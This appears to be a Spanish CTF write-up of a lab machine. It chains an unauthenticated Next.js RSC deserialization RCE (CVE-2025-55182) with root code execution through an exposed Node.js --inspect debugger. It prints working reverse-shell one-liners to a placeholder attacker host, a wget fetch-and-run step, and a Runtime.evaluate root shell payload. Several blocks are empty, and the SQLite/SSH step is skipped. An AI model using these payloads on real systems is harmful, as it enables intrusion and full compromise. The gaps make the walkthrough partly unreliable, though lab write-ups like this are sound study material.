Un panel de monitorización Next.js 15.0.3 expuesto en el puerto 3000 es vulnerable a **CVE-2025-55182** (React2Shell), una RCE por deserialización de RSC sin autenticar que da una shell como `node`. Una base de datos SQLite local revela el hash MD5 de `engineer`, que se crackea a una contraseña SSH reutilizada (`user.txt`). La escalada de privilegios abusa de un worker de Node.js propiedad de root arrancado con `--inspect`: haciendo un túnel al puerto del Inspector y enviando `Runtime.evaluate` por el WebSocket del depurador se ejecuta código como `root`.

## Explotación — CVE-2025-55182 (React2Shell)

### Cómo funciona el fallo

CVE-2025-55182 — apodada **React2Shell** — es una vulnerabilidad crítica (CVSS 10.0) de ejecución remota de código *sin autenticar* en el paquete `react-server` que sustenta los React Server Components. Next.js la hereda por completo porque su App Router y sus Server Actions se construyen directamente sobre ese mismo runtime de RSC (el gemelo específico de Next.js, CVE-2025-66478, fue posteriormente rechazado por el NVD como duplicado de la 55182).

La causa raíz es un fallo de **deserialización insegura** en el protocolo **"Flight"** de RSC — el formato de transporte serializado que React usa para transmitir datos de componentes renderizados en servidor y llamadas a funciones de servidor entre el servidor y el cliente. Cuando el servidor parsea un payload Flight entrante, resuelve referencias internas a objetos delimitadas por dos puntos (`:`). Manipulando esas referencias, un atacante abusa del duck-typing de JavaScript durante la deserialización para dirigir la lógica de reconstrucción hacia la invocación de código controlado por el atacante, alcanzando finalmente un sink de ejecución de código y ejecutando JavaScript arbitrario dentro del proceso del servidor.

Dos propiedades lo hacen catastrófico. Primera, es alcanzable **antes de cualquier comprobación de autenticación**, porque el manejo de la petición RSC ocurre por delante de la lógica de auth de la aplicación. Segunda, un build de producción estándar de `create-next-app` es vulnerable *sin ningún cambio de código* — el desarrollador no tiene que exponer ni una sola Server Action para que la superficie exista. Basta con una única petición HTTP manipulada, y el código inyectado se ejecuta con los privilegios de la cuenta que corre el servidor web — aquí, el usuario `node`.

Cloné la PoC pública y la usé para comprobar la RCE a ciegas forzando al objetivo a hacer un callback a mi máquina:


Como la primitiva es a ciegas (la salida del comando nunca vuelve en la respuesta HTTP), confirmé la ejecución fuera de banda con un listener. Un servidor web de Python en la máquina atacante recibió el callback:

```bash
python3 -m http.server

10.129.97.213 - - [06/Aug/2026 17:26:01] "GET / HTTP/1.1" 200 -
```

El `GET` entrante desde el objetivo demuestra ejecución arbitraria de comandos como `node`.

### De RCE a ciegas a una shell interactiva

Una reverse shell de una línea pasada en línea no conectó de vuelta. La razón es un desajuste de contexto de shell: el sink de la RCE ejecuta el comando a través de la shell de sistema por defecto (`/bin/sh`, que en Ubuntu es `dash`), y el idiom `bash -i >& /dev/tcp/...` depende de características exclusivas de bash — la redirección `>&` y el pseudo-dispositivo `/dev/tcp` simplemente no existen en `dash`. En lugar de pelearme con el escapado y los problemas de compatibilidad de shell, preparé el payload como un fichero e invoqué `bash` explícitamente para ejecutarlo.

Primero escribí la reverse shell en local y la serví:

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > rev.sh
python3 -m http.server 8000
```

Después descargué el fichero en el objetivo y lo ejecuté con `bash`, de modo que la redirección específica de bash corre bajo el intérprete correcto:

```bash
./exploit-nextjs.sh http://10.129.97.213:3000 'wget http://<ATTACKER_IP>:8000/rev.sh'
[+] SUCCESS - Request timed out (server hung executing command)

./exploit-nextjs.sh http://10.129.97.213:3000 'bash rev.sh'
[+] SUCCESS - Request timed out (server hung executing command)
```

El listener recibió el callback:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.97.213 33694
bash: cannot set terminal process group (1393): Inappropriate ioctl for device
bash: no job control in this shell
node@reactor:/opt/reactor-app$
```

Foothold conseguido como `node`. Un upgrade estándar de TTY (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) dejó la shell utilizable.

## Escalada de Privilegios — `engineer` → `root`

Con una shell estable como `engineer`, la enumeración estándar sacó a la luz un servicio bindeado localmente que destacaba. Listando los sockets en escucha:

```bash
ss -nltp
State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process
LISTEN  0       511         127.0.0.1:9229          0.0.0.0:*
LISTEN  0       4096          0.0.0.0:22            0.0.0.0:*
LISTEN  0       511                 *:3000                *:*
```

El puerto **9229** bindeado a `127.0.0.1` es la señal. `9229` es el puerto por defecto del **Node.js Inspector** (el backend del depurador). Confirmando qué proceso lo posee:

```bash
ps aux | grep node
root  1395  0.0  1.2 1067104 47780 ?  Ssl  14:53  0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Un proceso Node ejecutándose **como `root`** fue arrancado con `--inspect=127.0.0.1:9229`. Esta es la vía de escalada al completo.

### Por qué `--inspect` es el fin de la partida

Cuando Node.js se arranca con `--inspect`, abre un endpoint de depuración que habla el **Chrome DevTools Protocol (CDP)** sobre un WebSocket. El protocolo está diseñado para dar a un depurador control total del proceso en ejecución: expone el método `Runtime.evaluate`, que evalúa una expresión JavaScript arbitraria *en el contexto del proceso depurado*. No hay autenticación en el Inspector — el único control de acceso es que el puerto esté bindeado a loopback, y la suposición tácita de que solo un desarrollador local y de confianza puede alcanzarlo.

Esa suposición se rompe en cuanto un usuario local sin privilegios puede hablar con el socket. Como el worker corre como `root`, cualquier JavaScript evaluado a través de su depurador también corre como `root`. Dentro de un runtime de Node, llegar al sistema operativo es trivial: `require('child_process').execSync(...)` lanza un comando de shell. Así que `Runtime.evaluate` se convierte en una primitiva de ejecución de comandos como `root` — sin exploit, sin corrupción de memoria, solo el depurador haciendo exactamente aquello para lo que está construido, contra un proceso en el que no debería estar expuesto.

El único obstáculo es que `9229` escucha solo en `127.0.0.1`. Ya tengo un foothold en la caja como `engineer`, así que puenteé el puerto a mi máquina atacante con un forward local de SSH:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.97.213 -N
```

Con `-N` la conexión no abre ninguna shell remota — existe únicamente para transportar el túnel, mapeando mi `127.0.0.1:9229` local al Inspector del objetivo.

### Hablando con el Inspector

El lado HTTP del Inspector entrega la URL del WebSocket, pero una petición pelada solo se queja:

```bash
curl http://127.0.0.1:9229/
WebSockets request was expected
```

Los metadatos del depurador viven bajo un endpoint JSON conocido. Fuzzeando la interfaz HTTP lo localicé:

```bash
wfuzz -c -w /usr/share/SecLists/Discovery/Web-Content/big.txt -u http://127.0.0.1:9229/FUZZ --hh=33
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

```

`/json` (equivalente a `/json/list`) es el endpoint de descubrimiento estándar del Inspector. Consultándolo devuelve la `webSocketDebuggerUrl` de la sesión, incluido el UUID único de la sesión de depuración:

### Ejecutando código como root

Con la URL del WebSocket en mano, `wscat` se conecta al depurador y habla CDP directamente. El primer mensaje envía un `Runtime.evaluate` que ejecuta `id` a través de `child_process.execSync` — una comprobación de prueba de privilegio:

```bash
wscat -c ws://127.0.0.1:9229/6e5d1067-d88d-4659-871f-4ba720259bf8
Connected (press CTRL+C to quit)
> {"id": 1, "method": "Runtime.evaluate", "params": {"expression": "process.mainModule.require('child_process').execSync('id').toString()", "returnByValue": true}}
< {"id":1,"result":{"result":{"type":"string","value":"uid=0(root) gid=0(root) groups=0(root)\n"}}}
```

`uid=0(root)` confirma la ejecución de código como `root`. Cambiando el comando por una reverse shell — envuelta en `bash -c` para que la redirección `/dev/tcp` exclusiva de bash corra bajo bash — esa primitiva se convierte en una sesión root interactiva:

```bash
> {"id": 1, "method": "Runtime.evaluate", "params": {"expression": "process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\"').toString()", "returnByValue": true}}
```

El listener recibió el callback de root:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.97.213 45594
bash: cannot set terminal process group (1385): Inappropriate ioctl for device
bash: no job control in this shell
root@reactor:/# cat /root/root.txt
```

Compromiso total.

## Puntos Clave

- **La cadena de versión de un framework es una búsqueda de exploit.** Que Wappalyzer mostrara "Next.js 15.0.3" fue el puente completo del reconocimiento a la explotación: esa versión exacta fija un runtime de RSC de React 19 vulnerable a CVE-2025-55182, y las cabeceras RSC del banner crudo de nmap decían lo mismo antes de abrir un solo navegador.
- **La RCE a ciegas se confirma fuera de banda, no en la respuesta.** Cuando la salida del comando inyectado nunca vuelve, un callback controlado por el atacante (`curl`/`wget` a un listener) es la prueba fiable de ejecución — y el punto de pivote hacia preparar un payload real.
- **Las reverse shells de una línea fallan por desajuste de shell, no por la RCE.** `bash -i >& /dev/tcp/...` necesita bash; si el sink ejecuta comandos a través de `dash`, prepara el payload como un fichero e invoca `bash` sobre él explícitamente en vez de asumir que el vector está roto.
- **Vuelca SQLite con `strings` antes de recurrir a un cliente.** Un `*.db` legible por todos en un directorio de aplicación casi siempre contiene credenciales; `strings` recupera el esquema y las filas en un solo comando, sin necesidad de lenguaje de consulta.
- **Crackear un hash de aplicación debe ir seguido de forma refleja de un intento de SSH.** Las cuentas de aplicación y la cuenta de sistema del mismo nombre comparten contraseña de forma rutinaria; el MD5 crackeado de `engineer` fue directamente la llave SSH hacia `user.txt`.
- **Un proceso Node con `--inspect` es una shell root sin autenticar esperando a un cliente local.** El `Runtime.evaluate` del Inspector ejecuta JavaScript arbitrario en el proceso objetivo; si ese proceso es `root`, `child_process.execSync` es ejecución de comandos como root instantánea. El bindeo a loopback no es una frontera de seguridad una vez que tienes cualquier foothold local — un forward `-L` de SSH lo alcanza trivialmente. Los flags de depuración nunca deben estar en un servicio de producción propiedad de root.
